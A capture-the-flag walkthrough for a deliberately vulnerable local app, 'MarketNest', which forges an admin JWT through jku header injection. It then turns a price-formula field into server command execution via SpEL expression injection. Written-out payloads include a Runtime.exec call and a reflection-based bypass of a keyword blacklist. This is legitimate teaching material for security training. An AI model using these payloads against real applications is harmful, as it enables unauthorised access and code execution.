# MarketNest — Player Walkthrough

This guide is written for players who receive only the running application. It does not assume access to the source code. The intended path is to observe the application carefully, form small hypotheses, and use the feedback from each request to decide what to try next.

The challenge is designed to be solved locally with a browser and Burp Suite. The examples below use `http://localhost:8088`; replace that address if the challenge is hosted elsewhere.

## Public briefing

MarketNest is a retail-operations application. Retailers can view their workspace, while administrators can import product catalogs in bulk. Product imports contain a `priceFormula` field used to calculate a product's price.

Your objective is to reach the administrator-only bulk-import area, understand what the pricing field evaluates, and use the import preview as your feedback channel to retrieve the challenge flag.

The challenge is intentionally black-box: the application will not tell you the framework, the expression language, or the final file path directly. Those details are meant to be discovered from normal responses and controlled tests.

## What you need

- A browser.
- Burp Suite with the JWT Editor extension.
- Python, or another simple HTTP server, for hosting a public JWKS file.

## Stage 1 — Map the application

Open the site and create a normal account. Browse the available pages.

Record the following observations:

1. The login response sets a cookie named `pf_token`.
2. The token has the familiar three-part JWT shape.
3. The normal user can reach the ordinary workspace but is redirected away from the bulk-import page.
4. The import page accepts a CSV file and shows a preview containing a **Computed price** column.

## Stage 2 — Inspect the JWT

Inspect the `pf_token` in Burp or JWT Editor. Look for unusual header fields - in particular a `jku` field when forging tokens. A normal header resembles:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "marketnest-main-key"
}
```

## Stage 3 — Create a signing key and host its public half

Generate an RSA key pair in JWT Editor with a distinct key ID (e.g. `attacker-key`). Create `jwks.json` with just the public key:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "n": "YOUR_PUBLIC_MODULUS",
      "e": "AQAB"
    }
  ]
}
```

Start a local server: `python -m http.server 8000 --bind 0.0.0.0`. For Docker, use `http://host.docker.internal:8000/jwks.json` in the `jku` header.

## Stage 4 — Forge the administrator token

Update the JWT header to include `jku` pointing to your JWKS and `kid` matching your key. Set claims with `role: admin` for your username, sign with your private key, replace the cookie, and access `/dashboard` then `/import`.

## Stage 5 — Establish what the formula field does

Test with arithmetic: `7*7` should return `49.0`. Test with method calls like `'abc'.length()` returning `3` to confirm method-capable evaluation.

## Stage 6 — Read the rejection as a clue

A payload like `T(java.lang.Runtime).getRuntime().exec('id')` is rejected with a blacklist error mentioning `runtime`. This indicates Java type access is possible but filtered.

## Stage 7 — Bypass the textual blacklist

Construct blocked names via string concatenation:

```spel
(''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('id')
```

## Stage 8 — Turn command output into visible text

Wrap process output for display in the preview using `Scanner` over the process input stream via `T(java.lang.Process).getMethod('getInputStream')`.

## Stage 9 — Discover the target

List the application directory to find the flag binary.

## Stage 10 — Execute the discovered helper

Execute `./flagbinary` and read its output to retrieve the flag.
